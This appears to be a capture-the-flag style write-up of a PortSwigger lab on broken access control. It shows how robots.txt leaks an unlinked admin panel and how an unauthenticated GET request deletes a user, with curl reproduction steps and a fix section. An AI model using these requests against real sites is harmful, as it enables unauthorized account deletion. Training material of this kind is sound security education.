---
layout: post
title: "PortSwigger: Unprotected Admin Functionality"
date: 2027-09-20 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, AccessControl]
tags: [portswigger, access-control, broken-access-control, forced-browsing, robots-txt, admin-panel, cwe-284]
---

This shop has an admin panel that can delete any user, and the only thing standing between a stranger and that panel is a secret: the URL isn't linked anywhere on the site. The developers assumed that if nobody can *see* the link, nobody can *find* the page. But the site then hands the secret away in `robots.txt`, and the panel itself never bothers to check who you are. This is the gentlest flavour of [broken access control](https://cwe.mitre.org/data/definitions/284.html) — "security through obscurity" that isn't security at all.

## Overview

The lab is a single [improper access control](https://cwe.mitre.org/data/definitions/284.html) ([CWE-284](https://cwe.mitre.org/data/definitions/284.html)) issue. There is a working admin panel at a non-obvious path. It enforces **no authentication and no role check** — the developers "protected" it purely by not linking to it. The objective is to find the panel and use it to delete the user `carlos`.

## The technique

The first job is finding the panel. The standard recon move is to read `robots.txt`, the file that tells search-engine crawlers which paths *not* to index. Telling a crawler to stay away is the same as telling an attacker exactly where to look:

```
GET /robots.txt
```

```
User-agent: *
Disallow: /administrator-panel
```

There it is. Requesting that path returns the full admin UI — no login, no redirect to a sign-in page:

```
GET /administrator-panel
```

```html
<h1>Users</h1>
...
<a href="/administrator-panel/delete?username=wiener">delete</a>
<a href="/administrator-panel/delete?username=carlos">delete</a>
```

The panel lists the users with a delete link for each. The delete action is a plain `GET`, and like the panel itself it never checks who is asking. So an anonymous request deletes `carlos`:

```
GET /administrator-panel/delete?username=carlos
```

The server responds `302` and the user is gone — the lab flips to **Solved**.

## Reproducing it with curl

```bash
# 1. robots.txt leaks the admin path
curl -s https://TARGET/robots.txt
#    -> Disallow: /administrator-panel

# 2. the panel renders with no authentication
curl -s https://TARGET/administrator-panel

# 3. delete carlos as an anonymous request -> 302, solved
curl -s https://TARGET/administrator-panel/delete?username=carlos -o /dev/null -w '%{http_code}\n'
```

## Why it worked

Three separate failures stacked up:

1. **The path was disclosed.** `robots.txt` advertised the "secret" admin path. A `Disallow` entry is a signpost, not a lock.
2. **No authentication on the panel.** Requesting the path returned the admin interface to an anonymous user.
3. **No authorization on the action.** The delete endpoint executed an unauthenticated request without any role check.

An unlinked URL feels private, but every path is discoverable — through `robots.txt`, sitemaps, leaked links in client-side JavaScript, or simply guessing common names like `/admin` and `/administrator-panel`. Obscurity buys nothing once the URL is known.

## The fix

- Enforce **authentication and a server-side role check on every admin route**, denying by default. Put the check in central middleware so new admin routes inherit it automatically rather than relying on each handler to remember.
- Never treat a secret or unlinked URL as an access control.
- Don't list sensitive paths in `robots.txt`, and don't ship admin route names in client-side code.
